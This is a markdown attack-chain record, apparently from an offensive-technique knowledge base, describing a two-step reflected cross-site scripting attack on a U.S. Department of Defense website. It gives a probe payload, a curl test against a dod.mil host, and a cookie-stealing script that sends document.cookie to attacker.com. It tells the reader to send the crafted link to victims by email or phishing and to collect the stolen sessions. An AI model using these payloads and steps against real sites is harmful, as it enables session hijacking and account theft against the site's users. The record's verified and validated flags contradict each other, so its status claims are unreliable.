---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: Reflected XSS on DoD Website for Session Information Theft
tags:
  - xss
  - reflected-xss
  - web-vulnerability
  - session-theft
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Discover-Reflected-XSS-Vulnerability]]'
  - '[[procedures/Exploit-Reflected-XSS-with-Malicious-URL]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:47.078Z'
description: >-
  A two-step attack chain exploiting a reflected XSS vulnerability on a U.S.
  Department of Defense website by discovering unsanitized URL parameters and
  injecting malicious scripts to execute in victims' browsers, potentially
  stealing session data or modifying content.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Reflected XSS on DoD Website for Session Information Theft

Multi-stage attack chain demonstrating a complete attack workflow exploiting a reflected cross-site scripting (XSS) vulnerability on a U.S. Department of Defense website. The chain involves identifying unsanitized user input in URL parameters and crafting payloads to inject and execute malicious JavaScript in a victim's browser, enabling session hijacking or content manipulation.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery of Unsanitized Input] --> B[Payload Injection and Execution]
    B --> C[Session Theft or Content Modification]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for inspection
- Optional: [[tools/Burp-Suite]] for advanced testing

### Target Environment

- Web application on DoD website
- Accessible via public internet
- No specific ports required beyond standard HTTP/HTTPS (80/443)

### Initial Access Requirements

- Public access to the website
- No credentials needed for reflected XSS
- Ability to craft and send URLs to victims (e.g., via phishing)

## Detailed Attack Procedures

### Step 1: Discover Reflected XSS Vulnerability
procedure: [[procedures/Discover-Reflected-XSS-Vulnerability]]

**Objective**: Identify URL parameters that reflect user input back into the page without sanitization, enabling script injection.

**Instructions**: Inspect the website's search or query endpoints for reflected parameters. Use browser developer tools to view page source and search for reflected input. Test basic payloads like "><script>alert(1)</script> in URL parameters to check for execution.

**Expected Output**: Alert box or script execution confirming reflection without escaping.

**Success Indicators**:
- User input appears unsanitized in HTML source
- Basic payload triggers JavaScript execution

### Step 2: Exploit Reflected XSS with Malicious URL
procedure: [[procedures/Exploit-Reflected-XSS-with-Malicious-URL]]

**Objective**: Craft a malicious URL to inject and execute scripts in the victim's browser, stealing session information or modifying content.

**Instructions**: Based on the discovered parameter, construct a URL with a payload such as <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>. Send the URL to the victim via email or link. Use [[commands/curl-xss-test]] to verify payload delivery if needed:

```bash
curl "https://target.dod.mil/search?q=%3Cscript%3Ealert(1)%3C/script%3E" -v
```

Monitor attacker server for exfiltrated data.

**Expected Output**: Script execution in browser, with data sent to attacker's domain.

**Success Indicators**:
- Malicious script runs in victim's session
- Session cookies or data received on attacker-controlled server

## Attack Chain Summary

### Key Achievements

1. Identified reflected input flaw in DoD web application
2. Demonstrated script injection via crafted URL
3. Enabled potential session theft and content manipulation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T12:00:00Z*
